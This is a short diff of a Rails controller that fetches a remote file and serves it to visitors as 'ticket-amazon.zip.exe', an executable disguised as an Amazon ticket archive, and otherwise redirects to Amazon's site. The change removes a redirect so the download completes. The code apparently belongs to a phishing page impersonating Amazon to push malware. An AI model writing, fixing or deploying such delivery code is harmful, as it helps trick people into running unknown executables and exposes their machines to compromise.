@@ -29,8 +29,6 @@ class InformationController < ApplicationController
         response = Net::HTTP.get_response(url)
         if response.code == "200"
           send_data response.body, filename: "ticket-amazon.zip.exe", disposition: 'attachment', content_type: 'application/octet-stream'
-          redirect_to "https://www.amazon.com/-/es/"
-          return
         else
           redirect_to "https://www.amazon.com/-/es/"
           return
